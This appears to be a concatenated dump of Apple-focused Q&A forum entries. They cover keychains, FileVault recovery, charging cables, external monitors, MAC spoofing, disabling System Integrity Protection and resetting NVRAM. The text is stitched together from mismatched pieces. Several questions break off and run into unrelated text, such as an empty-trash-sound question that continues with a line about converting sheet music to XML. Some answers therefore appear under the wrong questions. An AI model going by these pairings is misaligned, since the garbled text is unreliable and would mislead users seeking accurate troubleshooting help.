app will only ask permission to access your Camera Roll if it wants to save a photo, or retrieve a photo for a specific use case (for example, for a profile picture). In most cases, the app will show you what it is doing with your image(s) as that is how Apple wants developers to build apps - so that they're user friendly and the user has as much control as possible. However, even if the app was built in a way that meant it would fetch images in the background (for example, Google Photos), you will always have to provide consent before it initiates anything.\nAlso, remember you always have the ability to decline access to your Camera Roll when the app asks, or you can go to settings and remove access from there.\nIf you have any further questions let me know.\nI don't have any sources to list, but I'm an app developer myself. \n", "Q: Private / Public Key Provisioning profiles are available in ~/Library/MobileDevice/Provisioning\\ Profiles.\nBut, when creating a Certificate Signing Request, where are the public and private key stored on Mac OS?\nMeaning, what are the exact location of these (i.e. the path)?\n\nA: They are stored in the Keychain. Usually you have these stored in your login keychain, which on disk is located at ~/Library/Keychains/login.keychain-db. However that file is not for manual manipulation.\nIn order to save them to files for transferring to another computer, you can open Keychain Access.

EDIT: To quickly answer my question, see the bottom edit.\nI forgot my GitHub account, so I tried reset my password. However, I'm not receiving any email. I tried it again, but to no avail.\nSo I thought I'd create a new GitHub account...\nI'm at https://github.com/join, filling out username, email, and password.

This is similar to decisions taken by Google and Apple and other browser vendors.\nAs GitHub requires newer Firefox, and newer Firefox requires newer OS X - you're basically stuck. You should update OS X to continue - or if you cannot do that, then upgrade the hardware or use a different operating system.\nYou never want to be using an operating system that went out of support years ago (in this case October 2014). The security risk is very high, and logging in to usually sensitive sites such as GitHub should not be done from an unsupported environment.\nIn regards to your edit, GitHub works fine if you use it with a modern system. It is NOT because GitHub’s join page is broken or down.\n", "Q: Should a 3m cable charge speed be significantly different than a 1m cable? I recently bought a 3m (meter) Apple charging cable and found that it was charging my iPad slower than usual. \nI plugged it to a USB tester and found that it charged at ~5v 1A.  By comparison, my 1m cable charged at around 5v 2A. \nIs it this normal, should there be that much of a difference?\nI'm testing by charging an iPad. The wall adapter is the genuine 12W iPad wall outlet rated at 5.2v at 2.4A. I have a genuine Apple 1m cable and I also bought a 3m and 1m cable third party cable off eBay. They are unbranded.\n\n\n*\n\n*Both genuine and non-genuine 1m cables charged my iPad at around 5v 2A. \n\n*The non-genuine third party 3m, cable charged the same iPad at a bit less than 5v 1A.\n\n\nThe cable nor USB tester gets warms up enough to feel, but the wall plug does, so I don't think it will be (hope it won't be) a fire hazard.\nHere are some pictures of the USB tester, maybe that will help. First one is a with the 3m cable \n\nThis one for the 1m cable\n\n\nA: The 3m (meter) 3rd party cable is the problem here.  There are two possibilities:\n\n\n*\n\n*it's for an older iDevice that didn't have or support quick charging (iPods, iPhones, etc.)\n\n*it's a cheap knockoff where the manufacturer didn't supply the correct chip to request higher power delivery\nWhen selecting a 3rd party (non-genuine) Apple accessory, it's always good to go with known brands - I myself prefer Anker or even Amazon basics.\nUnderstanding power adapters and cables\nThere's a lot of misunderstanding in the question about the role cables play in the charging process.  Let's clear some of that up...\n\n\n*\n\n*The cable itself, doesn't dictate how much power drawn.  Two cables of similar AWG (gauge or diameter of the wire) isn't going to draw vastly different amounts of power.  For the inherent resistance of the cable to become a factor in dropping power, we start looking at distances in the kilometer range (a thousand times longer than what you're working with).\n\n*A typical 20 AWG copper cable can support from 4A (multi-core like braided wire) and up to 6A (solid core) of current.  At 2A, you are well within the tolerances and \"getting warm to the touch\" is perfectly normal.\n\n*There are many differences for the amount of current draw on a device:\n\n\n*\n\n*Load -  an idle computer draws less power than one crunching away displaying video\n\n*Charging state - a fully charged battery draws less power to charge than a depleted one.  Also intelligent chargers go from \"rapid charge\" to \"trickle charge\" once a threshold has been reached.\n\n*Power Negotiation - intelligent devices like quality Apple cables or USB 3.1 chargers negotiate the amount of power delivered.  \n\n\n\nThe issue specific to your situation is the last point - power negotiation.  In Apple cables - both Apple branded and high quality 3rd party - there is a chip that negotiates with the power brick how much power to deliver\n\nPhoto courtesy Chipworks\nIf the chip in the cable only requests 1A of power, the power brick will only deliver 1A of power.\n\nA: If the cable/cord is built into the pronged outlet plug (i.e. the cable cannot be separated from the outlet plug), the difference could be because the device produces a different output current. If this is the case, check the plug end of the cable and look for printed text (it may be small) on the casing. Reading this text should confirm the output voltage/amperage.\nHowever, if your cables are not directly built into the plug end, then your cord that is producing fewer amps is probably dangerous and a fire hazard! \nWhy? -- If it is not transmitting close to the same current as your other cable/cord, that means the energy that would have been given to your device's battery is instead being dissipated/lost in the cable, probably as heat. In this case, don't use the cable - it could cause a fire and/or damage your electronic device.\nDoes the cable heat up? Does the cable have any damaged/exposed/frayed wires?\n", "Q: Running an installed app already paid for on an account not logged in I have an app I paid for on another mac under my Apple ID. Can I log into a different mac with the same Apple ID and install it, then log out with the app still working?\n\nA: You do not need to remain logged in to Mac App Store to use an app installed from there.\nYou may be asked for your Apple ID password which was used to purchase the app when installing an update.\n", "Q: Encrypted forgot password NO Recovery Key I forgot my password to my Macbook Pro and I dont have the recovery key.

I receive \" Error: -69749: Unable to unlock the Core Storage Voulume. \nI really dont want to try to erase everything I have so many memories in there.\nPlease someone help! \nApple Store was no help at all. \n\nA: When you loose both, your passphrase and the recovery key, chances are very high that your data is lost completely as FileVault is a very secure way to protect your data. This is Apple's support document describing possible steps in such a situation. \nHowever, there are a few things you could try:\n\n\n*\n\n*In case you have multiple users set up, try their passwords, as they may be enabled to decrypt the volume as well.\n\n*In case you have backups, they are not encrypted by default. You could recover your data from there.\n\n*Also, you could recover the Recovery Key from the FileVaultMaster.keychain file from such a backup (see method 3).\n\n*By default the iCloud recovery option is selected. In case you didn't change that during setup, you can use Apple's Reset Password assistant to get your recovery key from the iCloud.\nGood luck!\n\nA: The purpose of a password and encryption is to prevent people without the password from decrypting the content.\nYour question is basically \"how do I bypass the password and encryption on my computer?\" It wouldn't be very good protection if that was easy.\nYour options are:\n\n*\n\n*Use the password\n\n*Use the recovery key the computer supplied\n\n*Recover from the unencrypted backup you have at home\n\n*Pay someone to try to crack the password. If you chose a \"bad\" password, like \"Kathy\" they just might succeed.\n\nYou don’t have #1/#2 and you didn’t mention #3, so you will need a lot of luck with #4 - but chances are pretty good those memories are encrypted forever.\n", "Q: How to revert this defaults write command? defaults write com.apple.mail DisableInlineAttachmentViewing -bool yes\n\nIt is related to this question:\nHow can I disable inline attachment previews (i.e. view as icon by default) in Mac Mail in macOS Mojave?\n\nA: When you’ve written a boolean value, you can choose to write the opposite value, replacing yes with no.

The problem I have is that the 2 external monitors mirror each other.\nMacBook Pro (15-inch, 2018)\nmacOS Mojave\nVersion 10.14.3 (18D109)\n\nLenovo USB-C Dock Type: 40A9\n\nI looked at the display settings, and there is no options to change it. I also tried to connect one of the monitor through VGA port, the 2 monitors still duplicate. \nHow can I make the 2 external monitors display distinct content and not mirror each other?\n\nA: The ThinkPad Docks use the DisplayPort Multi Stream Transport (MST) Hub standard on the two exposed DisplayPort ports. This technique allows multiple external monitors to act as extended screen area as long as the hardware and  driver support MST Hub. Without MST Hub support, multiple external monitors on the dock can only act as mirrors of each other. Unfortunately, macOS does not support DisplayPort MST Hub. Only Thunderbolt chained monitors are supported. Presumably, Apple regards MST Hub as a legacy, dead-end technology.\nThis is not a bandwidth issue at all. If you run Windows 10 on the exact same Mac hardware, multiple monitors within the DisplayPort bandwidth work flawlessly as an extended desktop.\nYou can read more about DisplayPort MST technology at\nhttps://www.tripplite.com/products/multi-stream-transport-mst-hub-technology\nand\nhttps://www.caldigit.com/can-ts3-and-ts3-plus-support-displayport-multi-stream-transport-mst-feature/\nCurrently (April 2021), each Mac Thunderbolt 3 port supports only one display per Thunderbolt 3 port, and it needs to be the last one in the Thunderbolt 3 chain. I don't know for sure, but I suspect this refers to monitors using the DisplayPort Alternate Mode on the Thunderbolt 3 chain.\nYou can daisy chain multiple native Thunderbolt monitors on a single port. Once an adapter is introduced, the game is over.\n\nA: Old topic, but figured I should share a new update:\nThe Lenovo Thinkpad dock will support 2 separate displays. I found that if I plug one into the back of the dock (displayport to displayport) and the other into the front of the dock (displayport to USB-C) it'll run them both as separate displays along with my MB Pro 16 display.\n\nA: The MacBook only supports dual displays including the built in display.  In other words, it will only support one external monitor.  Per the tech specs:\n\nDual display and video mirroring: simultaneously supports full native\n  resolution on the built-in display and up to 4096-by-2304 resolution\n  at 60Hz on an external display, both at millions of colors\n\nThe Lenovo C-Dock doesn't enable your MacBook to supply more display bandwidth than Apple provides.  So, the mirroring you are seeing is expected behavior. \nFrom the comments...\n\n...I should specify that my MacBook is actually MacBook Pro (15-inch,\n  2018). Would that make any difference?\n\nYes and no. \nYes in that the MacBook Pro (as opposed to the MacBook) can support more than 1 external monitor.  However, as you've already discovered, if you connect them separately, it works.  Unfortunately, you can't daisy chain monitors from a single port; you must use separate ones.  Use of the dock still doesn't increase the available video bandwidth of the Thunderbolt/DisplayPort port even if the machine itself has the capability.\n\nA: I currently run 4 displays off a single USB-C port to a thunderbolt dock. I have 2 of the lenovo docks daisy chained and I only plug 1 USB-C cable into my laptop. If you are having an issue with it duplicating your display check your drivers and the setting on the dock. \n\nA: This was working for me (15\" MacBook Pro, 2018) with 2 Dell monitors connected using a ThinkPad Hybrid USB-C with USB-A Dock, with a single USB-C cable providing my laptop with power and driving the two external monitors as separate displays (not mirrored).  Unfortunately that dock went back to work, and I bought a ThinkPad USB-C Dock Gen2, which looked similar.  Using this dock, the external displays are mirrored.  I have the DisplayPort software installed and I have tried everything I could think of.  So I'm going to try and negotiate a return / replacement.\n", "Q: My Mac keeps adding double spaces randomly when I type I'm  running  Mac Version 10.14.3 on a 15-inch 2018 model.\nI'm not sure if I received a new update but over that last few days it keeps adding random double spaces as I type.\nI tried turning off key repeat as suggested on some websites but that hasn't corrected the issue.

This means that there's two kind of support for languages. For the sake of understanding let's call them as below:\n\n\n*\n\n*Full support\n\n\nand\n\n\n*\n\n*Partial support\n\n\nThe languages listed under the first section, IPHONE LANGUAGES are fully supported by iOS, the operating system running on your iPhone. This means that if you select a language from this list, most of the textual items/instructions in your iPhone will use that language. Basically, selecting a language from this list lets you change the device language.\nYou may wish to refer to the Apple Support article, Change the language on your iPhone, iPad, or iPod touch\nOn the other hand, the languages listed under the second section, OTHER LANGUAGES aren't supported fully by iOS. This means selecting one from it won't change the interface language of the device and you'd continue to see the textual items/instructions in your iPhone in the language selected in first section (device language).\nHowever, the selection from OTHER LANGUAGES list is used by internationalized apps and websites. If you select a language from this list, apps and websites with content localized in it will be display it in the selected language.\nWhen setting it up for the first time, your iPhone chooses the default language as device language corresponding to your locale.\n\n\nA follow up: When I develop an app or website for iOS, languages of which list should I be aware of?\n\nA generally followed practise is to create the app (content) in English and localize it to work with all the languages your target audiences uses/expects to use it in.\nIt is recommended to refer to the Apple Developer document, Internationalization and Localization Guide\n", "Q: macOS High Sierra 10.13.6 empty trash sound playing repeatedly I am trying to figure out how to convert a piece of sheet music to XML file for a student.

You can also attempt to create a temporary file/folder, move it to trash and empty it to ensure that the sound plays only once.\nSince restarting your computer has fixed the issue, it was most likely due to some bug in macOS High Sierra.\nIn cases like this, restarting is the first resort towards fixing.\n", "Q: Hosting a VPN with Airport Extreme Following a factory reset, is my Airport Extreme 2013 no longer forwarding VPN traffic?\nFor years I have hosted a VPN from my home with various versions of Server.app (currently 5.6.3, latest for High Sierra) on various versions of OS X (currently 10.13, High Sierra) installed on a Mac Mini, wired through various ethernet hubs/switches to an Airport Extreme router (2013, 6th Generation running version 7.7.9).\nRecently, my entire network went down.  Before I noticed this was due to a 8 port hub losing power, I factory reset the router (unplugged power, held down reset button, plugged in power, waited for lights to start blinking, and reconfigured router).  Neither the physical topology of my network has not been altered, nor have the IP addresses of devices on my network changed.\nNow, everything appears to be working except for VPN.  I have had success forwarding various services (ssh, http, https) from outside the network to the Mac Mini.  I have a forwarding rule for VPN setup on the router (UDP ports 500, 1701, 4500; TCP port 1723), and the VPN service within Server.App enabled on the Mac Mini.  I am able to connect to the VPN service from within my network, but outside the network (e.g., iPhone over cell network) I receive the error message:\n\nThe L2TP-VPN server did not respond.  Try reconnecting.  If the problem continues, verify your settings and contact your Administrator.\n\nAttempting to scan for open ports on the router from outside the network reveals the ports for the other services (22, 80, 443, etc.), but none of the VPN ports (500, 1701, 4500, or 1723).  Attempting to scan for open ports on the Mac Mini from inside the network reveals the same situation.  This is the case both inside and outside the network whether I use my modem's external IP, a dynamic hostname (provided by ddns.net), or a subdomain on a CNAME entry for a DNS record I have control over.\nI do not think my ISP is blocking VPN traffic as this setup worked less than a week prior to the network mishap.\nI think something has gone wrong on the router.  I have tried these things:\n\n\n*\n\n*enabled IGMP Snooping as suggested in this post: VPN Passthrough problems with Airport Extreme.\n\n*ensured IP ranges do not overlap (as suggested also in above post): wired static from .1 - .49; wireless static from .50 - .99; DHCP from .100 - .199, and VPN on .224 - .254.\n\n*ensured Back To My Mac is disabled on the router and the Mac Mini (indeed, I don't believe Back To My Mac exists as such on High Sierra).\n\n*taken the router out of the loop and connected the Mac mini directly to the cable modem.  Connections to the VPN succeeded.  This confirms that my ISP is not blocking VPN traffic, that the VPN server is working (for internal and external clients), and that the Airport Extreme is the problem.\n\n\nThings I have not yet tried:\n\n\n*\n\n*alternative VPN software (OpenVPN).  I think VPN in Server.app is working as I can connect to it on the internal network.\n\n*alternative ports, e.g., on the router forward 22 to 500, 80 to 1701 and 443 to 4500.  I have not tried this because I don't know how to configure the VPN client to try to connect on these ports.  It also seems not possible to configure the VPN server (at least the one within Server.app) to listen on different ports.\n\n\nA: First check the settings on the AirPort Extreme to ensure that the box labelled \"Allow incoming IPSec authentication\" in \"Network Options...\" under \"Network\" is checked.\nThen I suspect what have happened is that your Mac Mini has received a different internal IP address. This could lead to the port forwardings that you have had setup not working anymore, which is confirmed by the fact that you cannot see your port forwarding of TCP port 1723 with a port scanner.\nOn the Mac Mini open System Preferences and Network, and find the internal IP address of your Mac Mini. It might be for example 192.168.2.10. Then check the port forwardings on the Airport Extreme under \"Network\" and \"Port Settings...\". Ensure that the field \"Private IP Address\" lists the internal IP address of your Mac Mini for all the VPN related ports  (UDP ports 500, 1701, 4500 and TCP port 1723).\n\nA: Turns out it was an incorrect shared secret on the external devices.\n", "Q: Lost connection after spoofing MAC address I've changed the MAC address using\n$ ifconfig en1 |grep ether\n    ether b2:n7:v8:x6:31:k2\n$ openssl rand -hex 6 | sed 's/\\(..\\)/\\1:/g; s/.$//'\n69:b5:32:54:75:38\n$ sudo ifconfig en1 ether 69:b5:32:54:75:38 \nPassword:\n$ ifconfig en1 |grep ether\n    ether 69:b5:32:54:75:38\n\nAfter that all my network connections got lost.

If the interface is already up when this option is used, it will\n    be briefly brought down and then brought back up again in order to ensure that\n    the receive filter in the underlying ethernet hardware is properly reprogrammed.\n\nSo loosing the connection is the expected behavior here.\n", "Q: CoreStorage disk won't unmount My roll-your-own Fusion drive has become corrupted somehow, and I want to start all over. However, it won't unmount. When I run (from another startup disk, of course) \ndiskutil cs delete <Logical Volume Group UUID>, Terminal returns \nUnmounting Logical Volumes\nEjecting Logical Volumes\nThe disk disk2 couldn't be ejected\nError: -69691: Couldn't eject disk\n\nHow can I either unmount the Fusion drive, or erase it?\n\nA: Something may be mounting the disk on your startup system. Try to exclude the disk from spotlight, time machine and so on.\nAfter that, there are a few unmount options in the terminal - sometimes, you have to unmount the volumes before you unmount the disks, or vice versa, and such.\nAlso, a few times in my past, the disk utility from the gui could unmount something which the diskutil command could not.\nAs a final recourse, try all this with the online recovery (it tends to be less likely to mount something) and/or the original version of MacOS your Mac shipped with (it may not understand new features of your Fusion Drive's file system, which is an advantage when deleting it).\nOn a sidenote, the zeroDisk option in Diskutil cleans up your disk more radically (and wears down the SSD more), but may help when issues remain. But it also only works when unmounting worked. You use it on both disks and let Disk Utility repair the Fusion Drive again. Use it only when deleting is unsuccessful. Be aware that a small error can delete the wrong disk, that there is no going back from it, that it takes a long time (though usually you can stop it with ctrl-c after the first percentage above 0 appears), and that it may destroy a disk (lots of zeros will be written).\n\nA: Below is the output from diskutil list of an the arrangement to be used in this example.\n/dev/disk1 (disk image):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        +128.0 GB   disk1\n   1:                        EFI EFI                     209.7 MB   disk1s1\n   2:          Apple_CoreStorage lvgDave                 127.7 GB   disk1s2\n   3:                 Apple_Boot Boot OS X               134.2 MB   disk1s3\n\n/dev/disk2 (disk image):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        +1.0 TB     disk2\n   1:                        EFI EFI                     209.7 MB   disk2s1\n   2:          Apple_CoreStorage lvgDave                 999.7 GB   disk2s2\n   3:                 Apple_Boot Boot OS X               134.2 MB   disk2s3\n\n/dev/disk3 (disk image):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:                  Apple_HFS Dave                   +1.1 TB     disk3\n                                 Logical Volume on disk1s2, disk2s2\n                                 E6BEB7BA-4B92-4A10-A251-7C97589D4A2C\n                                 Unencrypted\n\nIf you wish to destroy the Core Storage arrangement, then start by changing the partition type to Linux.

As they take up quite a lot of space, and recently, I found a malicious file named SystemExtr residing inside one of the folders, and deleted it, but somehow it returned.\n\nA: Note: this doesn't answer your question directly but is advice and some further steps to troubleshoot.\nIf your computer has been reported as being affected my malware, you are likely better off long-term to back up your personal data (i.e user directory etc), note the apps you have installed, and start over with a nuke & repave. A few hours spent doing this is better than rescuing a system with unquantified levels of malware -- it could be just 'SystemExtr' or it could be a whole heap of other things -- and the nature of some malware means it can't be 100% removed.\nIn the meantime:\n\n\n*\n\n*use a reputable macOS malware scanner like Malwarebytes or Sophos to see if they pick anything up;\n\n*upload one of the executables to VirusTotal to see if it find anything;\n\n\nAnd for ongoing homework: learn a bit about hard drive space management and reduce reliance on the whizzy apps (especially the free ones) that do all this for you. Some are reputable, some are junk. Using a disk viewer like Grand Perspective will give you better visibility into what's going on inside your hard drive, and give you more control overall.\n", "Q: How do I get rid of iCloud connection between iPhone, iMac and iPad? How do I get rid of the iCloud connection between my iPhone, iMac and iPad?\n\nA: Since you have signed in all the devices with an account, you can only turn off iCloud for specific services you don’t want to continue syncing. \nLogging out is one radical option but it renders several apps like app store unusable. \nOn iOS, go to Settings -> Apple ID (first thing in the list) -> iCloud. Then disable whatever iCloud service you do not want to use.\nOn MacOS, go to System Preferences-> iCloud and do the same.  \nYou might want to keep some things in iCloud like iCloud Drive documents for which turning it on iMac would be helpful if you some day might want to access them remotely. \n", "Q: Is it possible to send notification to Apple Watch but show alert on iPhone? I want to receive notifications for Messages.app on my Apple Watch (so that I can see the notifications in the control center), but I don't want my watch to vibrate every single time I get a message.\nI do however want to be alerted of new messages. I also don't like the normal vibration that the iPhone uses (it's too long and distracting), so I made a custom vibration for Messages.app from notifications settings. \nHowever, it seems like I can't simultaneously make alerts play on my iPhone and have notifications delivered to my Apple Watch. Is there any way to achieve this? \nOne possibility would be to have multiple apps for notifications. For example, for mail, I could use the custom vibration possible for the stock Mail.app to notify me on phone, and get notifications to my Apple Watch (without alerts) via the Gmail app. However, there is only one iMessage app and of course I wouldn't want to connect it to a third-party service. \n\nA: If you want a solution specifically for the messages app, you could use the messages app complication on the watch. This shows you the number of unread messages you have.

I've just got my Google Chrome updated to Version 73.0.3683.86 and run it on  macOS Mojave 10.14.3 with dark mode set. \nI prefer to use Chrome in light mode with some custom themes. \nCan I revert Chrome back to the light mode in spite of Mojave operating in dark mode?\n\nA: \nCan I revert Chrome back to the light mode in spite of Mojave operating in dark mode?\n\nInstall a theme from the Chrome Web Store.\nChrome themes do not \"respond\" to dark mode -- the colors specified in the theme will be used regardless of the current system appearance.\n\nA: Easy. Open up your terminal and write:\ndefaults write com.google.Chrome NSRequiresAquaSystemAppearance -bool YES\n\n\nA: Unfortunately, the dark mode setting is entirely macOS-controlled and cannot be disabled for specific apps which are dark mode enabled. If you have dark mode enabled in macOS, Chrome will run in dark mode. There is no corresponding setting in Chrome to ignore the macOS setting.\nLike you, I don't like the Chrome dark mode, but I do like the macOS dark mode, so we're both stuck.\n\nA: The \"Plain\" theme from the Chrome Web Store:\nhttps://chrome.google.com/webstore/detail/plain/ajpcdipecmmhmhfchegpaflpjkmceiip?hl=en\nappears to revert Chrome to its default settings.\nI no longer have to squint to tell which is the active tab.\nThe icon for the \"Tabs\" extension is recognizable again, also without squinting.\nThis solves the problem that was why I came to this thread.\nFor a more generic solution that applies to different apps, here's a Terminal technique that resets the default for any specific app, even built-in apps:\nhttps://webtrickz.com/disable-dark-mode-for-specific-app-on-mac/\nYMMV.\n", "Q: Finder.app won't open after I edited Info.plist I'm on macOS Mojave 10.14.3. I wanted to remove the Finder.app from the CMD+TAB, so I followed this tutorial and this solution to be able to edit the Info.plist file.\nThe steps I followed were:\n\n\n*\n\n*Reboot into Recovery Mode\n\n*Run csrutil disable\n\n*Reboot into normal mode\n\n*Edit Info.plist as root\n\n*Run codesign -fs - /System/Library/CoreServices/Finder.app/ as root\n\n*Reboot into Recovery Mode\n\n*Run csrutil enable\n\n*Reboot into normal mode\n\n\nAfter those 8 steps, I expected to get my system working normally, but without Finder.app showing up in the CMD+TAB. Instead, I got a system where I can't open Finder.app at all. When I try to open it, it will say \"The application 'Finder.app' can't be opened.\"\nSo I decided to revert it, I did all the steps like before, but now I removed the additional lines from Info.plist. It didn't work, Finder.app still won't open, even after I changed Info.plist to the original state.\nWhat can I do? \n\nA: I would boot to internet recovery or another OS and reinstall finder by reinstalling the OS. That leaves all your apps and files intact and fixes whatever problems finder had. \nI have fast network, usually have both the internet recovery image and the OS cached on my Mac mini that runs caching server (or Mojave cache service), so the operation takes 5 minutes instead of 25 that is typical on fast networks. \n\nA: Future people, no need to redownload the OS, you only need a recent version of the Finder.app from a working Mac computer (I was in the same scenario and grabbing a Finder.app from a working mac solved it).\nI would have uploaded Finder.app to github, but I'm afraid of Copyright issues, also Finder.app will eventually change...\n", "Q: will I have to provide banking information and tax forms upon enabling IAP in addition to signing the Paid Applications agreement?

I'm interested in 'cutting the cord' to digital (\"cable\") TV service, so I'm exploring the \"online\" options, such as streaming through my Apple TV (3rd Gen.). I notice that usually when I try to do that, it requires me to visit activate.somewhere.com or otherwise sign in with my TV Provider credentials. What is this all about? And what happens when I don't have a \"TV Provider\" any more? Will this still work if Verizon (or someone else) still provides only my Internet service? Much thanks.\n\nA: It's just a place where Apple lets you enter one account and then many apps can use that single sign on to validate you're paying for paid content. This feature is implemented on iOS and tvOS currently.\nIt's up to each third party app to use the service / API - but in the US this works amazingly well. Many people use it to cut the cord and pay nothing for cable or television packages. You simply pay one of many providers and choose the one you wish to use most and enter it in the OS.\n\n\n*\n\n*https://support.apple.com/en-us/HT209233\nI expect we'll have more news about this within a week (Apple Special Event\nLive from the Steve Jobs Theater in Cupertino.\nMarch 25, 2019, at 10:00 a.m.)  and you'll need to read up on your internet provider to see to what degree they implement network neutrality. Some network providers filter / block / charge extra for streaming data - others don't care what bits you download or from where those bits originate. Most providers are somewhere in the middle - throttles and caps, but for most cases you can use this without any added costs or hassle.\n", "Q: How can I block email signup overlays or javascript popups in Safari? Is there a Safari extension or something that will block the Javascript modal popups that are now ubiquitous (soliciting mailing list signups)?\nFailing that, are there extensions that will simply block sites that utilize these modal popups? I'm ok with any of these options:\n\n\n*\n\n*Block the modal popup\n\n*Close the tab immediately if a popup happens\n\n*Block/remove the site from search results\n\n\nThere are so many sites these days that I have no reason to spend time on a site that utilizes popups. I'd rather not know they even exist so if an extension can remove them from DuckDuckGo results that would be outstanding.\n\nA: \n...are there extensions that will simply block sites that utilize\n  these modal popups?\n\nThe problem here is that they are not pop-ups as what you are traditionally used to.  They are basically HTML elements that are overlayed over the parent HTML document.\nBlock the modal popup\nWhat makes this extremely difficult to block is that site functionality may depend on it.  Some modals may contain nonsense while others might have important information (i.e. shopping cart, contact form, etc.)\nChrome/Firefox has a plugin called Behind the Overlay but results are spotty at best.  I don't know of any for Safari.\nClosing the tab\nThis really wouldn't be workable since this isn't a popup of a new window/tab - it's an HTML element in the same document.  Closing the tab would close out the whole session on that webpage.\nBlock site from search results\nThis is a function of the search engine and not of Safari.  Most HTML 5 compliant sites now use these modals so blocking the sites would be counter productive.  However, if there is a site you wish to ignore because of their use of modals, you can exclude it in your search query (Bing, Google, DuckDuckGo)\nMacbook Pro -apple.com\n\n\nA: I’m a huge fan of a couple paid content blockers on iOS.

I needed to use the Macbook for 3 years for school and I can't afford a new one \n\nA: Depending on the age of your MacBook, you'll have one or more connections on the side that an external screen can connect to. When you identify your MacBook you'll be able figure out the best way to connect a screen, whether it's directly or using an adaptor.\nIf the external monitor doesn't help, the onboard graphics may have gone pop, which might have affected the screen. In that case, go the Target Disk mode route -- but you'll need another Mac and a connecting lead (Thunderbolt or Firewire depending the age of the MacBook) for it to work.\n\nA: The easy way to access files and back them up is to connect to another Mac via target disk mode. Just the bare minimum parts of the system like the disk controller and selected bus need to work.\n\n\n*\n\n*Does working in Target Disk mode hurt hardware?\nApple has support articles and dozens of questions here cover most of the common scenarios to use target disk mode. If you need to pay someone to transfer the files - start with your school IT team and once you're set, ask them for guidance to store critical files in the cloud or set up a backup. For now you'll need to determine if the files are accessible and then plan your next steps.\n", "Q: Add arcfour Cipher to Mojave 10.14 Im trying to use the arcfour cipher with SSH.

However, doing so will require significant C programming experience.\nIn practice, I would advise you to reconsider what you are doing.\n", "Q: How long does it take for an initial charge with MBP? We unboxed a new 2017 MBP three hours ago. I wasn't expecting it to start by opening the lid. I then went through all the stuff you have to do when you startup (icloud, apple id, etc) It was at 34%. It has been charging for two hours. It's at 41%. The charger is in the port furtherest from the front. Is this normal? All of this? I have since shut down to charge (and of course have no idea what is going on now since there is no LED). How long does it take to do the full charge? And was it normal to start by lifting the lid? Brand new (well, brand new looking with wrap)\n\nA: Power it off. The first 80% should charge in 2 hours. The last 20% should charge in the second 2 hours. \nIf the battery was deeply discharged I would repeat that test once you get the battery full and then drained. \nContact support either way to have them check the full charge capacity and review your powered down charge timings. \nThat protects you and gives Apple the data it needs if you feel it wasn’t a great battery. In the past, Apple would ship closer to full. Now with changed airline regulations and changed chemistry in the batteries, they ship mostly empty. I wouldn’t worry once you get your two tests in and contact support. \nEverything you say seems perfectly normal, but for sure shut it down and do a controlled test - now is when you want to be sure it’s fully operational. \n", "Q: Resetting PRAM through Terminal For some reason, my Mac won't let me reset my PRAM in the usual way (by holding the relevant keys down when restarting), simply nothing happens when I try it and my Mac just boots up normally every time.\nI'm suspecting this may be due to the fact I'm using a PC keyboard after I broke my Apple one a while back.\nI read that I can reset my PRAM through Terminal with the following command:\nsudo nvram boot-args=”-p -r”\n\nBut all I get is this error:\n\nnvram: Error setting variable - 'boot-args': (iokit/common) general error\n\nI'm running High Sierra on a late 2009 iMac if that helps\n\nA: According to an Apple Support page called \"Prepare your institution for iOS 10 and macOS Sierra\":\n\n...you must use the nvram command to properly set boot-args NVRAM variable. Starting with macOS Sierra, you must be booted to the recovery partition to run this command.\n\nBut now you can clear the NVRAM with\nsudo nvram -c\n\nThen restart for the reset to take effect.\nI also have a PC keyboard that doesn't seem able to reset the NVRAM on startup, but I think the real problem is that it's wireless. But this command is easier and more reliable anyway.\n\nA: Sounds like a SIP restriction rather than a keyboard issue. Read through the linked article to get an idea of what SIP is, and then try this:\n\n\n*\n\n*Ensure you have an up-to-date backup, in case of emergency.\n\n*Power off your Map as normal.\n\n*Hold down Cmd-R and press the Power button. Windows keyboard should be Win-R instead. Keep holding the keys down until the Apple logo appears, then release.\n\n*Wait for macOS to boot into the recovery utilities window.\n\n*From the Utilities menu, choose Terminal. Then: csrutil disable, then exit, then reboot into High Sierra as normal.\n\n\nI'm not sure where you're getting -p -r as boot args to reset NVRAM, but sudo nvram -c should do the trick on High Sierra, as Tetsujin states here.\nWhen you're done, reboot into recovery mode once more, open Terminal and then re-enable SIP with csrutil enable, and reboot into High Sierra.\n", "Q: Importing only RAW with Photos - ignoring JPEG My camera creates both RAW and JPEG photos. Normally I delete the JPEG photos before importing. Today I forgot to do that. Now the photos on the card are deleted, and it seems that I only have JPEG images in my Photos library. \nTo test this I created two smart albums, one with only RAW, one with no RAW - effectively JPEG only. The last photos are only found in RAW, not in the JPEG album. Why is that? I can't find a setting to prefer RAW either. \nWhy would Photos ignore the RAW files, while it's obvious that these are preferred? \n\nA: If you see a J in a square on the top right of the image, you're using the JPEG image. You can change this to RAW using the following steps:\n\n\n*\n\n*Open the image\n\n*Click the yellow edit button\n\n*Menu: Image > Use RAW as original\n\n*Click done\nYou will now see an R in a square instead of the J.

She has a flip-phone (Tracphone) that she is comfortable with and I am certain she will switch to any smartphone.\n\nA: My suggestion: Buy a cheap refurbished iPhone, bond the watch to it, then put the phone in a drawer. The LTE Apple Watch doesn’t need the iPhone to be on or nearby if it’s a Series 4 or later. It is NOT possible to set up an Apple Watch on a number that s completely separate from its iPhone bond mate.\nBTW, she can make calls from the Apple Watch without the iPhone involved, but it has to be bonded to an iPhone.\nI’m betting you know somebody who has an iPhone 6/7 with a shattered screen or bad battery. \n", "Q: Unable to boot Mac.

